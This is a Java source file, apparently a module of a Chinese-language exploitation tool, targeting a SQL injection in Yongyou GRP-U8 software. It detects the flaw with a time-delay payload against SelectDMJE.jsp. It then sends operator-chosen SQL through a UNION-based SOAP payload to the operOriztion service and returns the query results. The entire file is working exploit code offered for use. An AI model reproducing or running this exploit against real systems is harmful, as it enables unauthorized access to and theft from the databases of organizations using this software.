package exp.oa.yongyou.grp;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.HttpTools_getTime;
import utils.Response;
import utils.getIndexOf;

import java.util.HashMap;

public class yongyou_grpu8_operOriztion_sqli implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea, textArea_cmd);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        Platform.runLater(() -> {
            textArea.appendText("\n 该漏洞为sql注入漏洞，无法执行命令");
        });
        return false;
    }
    @Override
    public Boolean checkVulCmd(String url,String cmd ,TextArea textArea, TextArea textArea_cmd) {
        return attcmd(url, cmd, textArea, textArea_cmd);
    }
    private Boolean att(String url, TextArea textArea, TextArea textArea_cmd) {
        try {
            HashMap<String, String> head = new HashMap<>();
            long var = HttpTools_getTime.get(url + "/u8qx/SelectDMJE.jsp?gsdm=1&kjnd=1&userId=1&xmdm=1';WAITFOR+DELAY+'0:0:3'--" , head, "utf-8");
            if (var > 3000) {
                Platform.runLater(() -> {
                    textArea.appendText("\n [ yongyou_grpu8_operOriztion_sqli ]");
                    textArea.appendText("\n (1) 利用sqlmap模块进行利用,注入类型:延时注入");
                    textArea.appendText("\n (2) CMD输入sql语句进行利用,注入类型:联合注入,eg:user_name()");
                    textArea.appendText("\n");
                });

                String target_req = "POST /services/operOriztion HTTP/1.1\n" +
                        "Host: "+ url.substring(url.indexOf("://")+3)+"\n" +
                        "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\n" +
                        "Content-Length: 511\n" +
                        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\n" +
                        "Accept-Encoding: gzip, deflate\n" +
                        "Accept-Language: zh-CN,zh-HK;q=0.9,zh;q=0.8\n" +
                        "Cache-Control: max-age=0\n" +
                        "Connection: close\n" +
                        "Content-Type: text/xml;charset=UTF-8\n" +
                        "SOAPAction: \n" +
                        "Upgrade-Insecure-Requests: 1\n" +
                        "\n" +
                        "<soapenv:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:wsdd=\"http://xml.apache.org/axis/wsdd/\">\n" +
                        "  <soapenv:Header/>\n" +
                        "  <soapenv:Body>\n" +
                        "      <wsdd:getGsbmfaByKjnd soapenv:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\n" +
                        "        <kjnd xsi:type=\"xsd:string\">gero et' UNION ALL SELECT user_name()--</kjnd>\n" +
                        "      </wsdd:getGsbmfaByKjnd>\n" +
                        "  </soapenv:Body>\n" +
                        "</soapenv:Envelope>";
                Platform.runLater(() -> {
                    textArea_cmd.appendText("\n----------------------------------------------------------------------\n"+
                            "\npayload:\n"+target_req +
                            "\n----------------------------------------------------------------------\n"+
                            "\n延时时间: "+var+"毫秒\n----------------------------------------------------------------------\n");
                });

                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n");
                });
                return false;
            }

        } catch (Exception e) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }

    public static String operOriztion(String url, String sql){
        try {
            HashMap head = new HashMap();
            head.put("Content-Type","text/xml;charset=UTF-8");
            head.put("SOAPAction"," ");
            String var = "<soapenv:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:wsdd=\"http://xml.apache.org/axis/wsdd/\">\n" +
                    "  <soapenv:Header/>\n" +
                    "  <soapenv:Body>\n" +
                    "      <wsdd:getGsbmfaByKjnd soapenv:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\n" +
                    "        <kjnd xsi:type=\"xsd:string\">gero et' UNION ALL SELECT "+sql+"--</kjnd>\n" +
                    "      </wsdd:getGsbmfaByKjnd>\n" +
                    "  </soapenv:Body>\n" +
                    "</soapenv:Envelope>";
            Response res = HttpTools.post(url+"/services/operOriztion",var,head,"utf-8");
            if(res.getCode()==200 && res.getText().contains("getGsbmfaByKjndReturn")){
                String var1 = getIndexOf.getXMLStr(res.getText(),"ns1:getGsbmfaByKjndResponse","getGsbmfaByKjndReturn");
                return var1;
            }
        }catch (Exception e){
            return null;
        }
        return null;
    }

    private Boolean attcmd(String url,String sql, TextArea textArea, TextArea textArea_cmd) {
        try {
            String var = operOriztion(url,sql);
            if (var !=null) {
                Platform.runLater(() -> {
                    textArea.appendText("\n SQL语句: "+sql+" 执行成功");
                    textArea_cmd.appendText("\n----------------------------------------------------------------------\n");
                    textArea_cmd.appendText(var +"\n");
                    textArea_cmd.appendText("\n----------------------------------------------------------------------\n");
                });

                return true;
            }else {
                Platform.runLater(() -> {
                    textArea.appendText("\n SQL语句: "+sql+" 执行失败");
                });
                return false;
            }

        } catch (Exception e) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }

}
